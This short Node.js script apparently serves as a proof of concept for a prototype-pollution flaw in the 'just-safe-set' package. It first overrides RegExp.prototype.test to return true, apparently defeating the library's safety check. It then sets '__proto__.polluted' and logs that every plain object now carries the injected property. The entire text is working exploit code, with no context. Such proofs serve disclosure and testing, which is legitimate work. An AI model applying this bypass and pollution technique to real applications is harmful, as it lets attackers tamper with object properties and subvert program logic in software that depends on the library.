RegExp.prototype.test = () => true;
const justSafeSet = require('just-safe-set');
let obj = {};
console.log({}.polluted);
justSafeSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);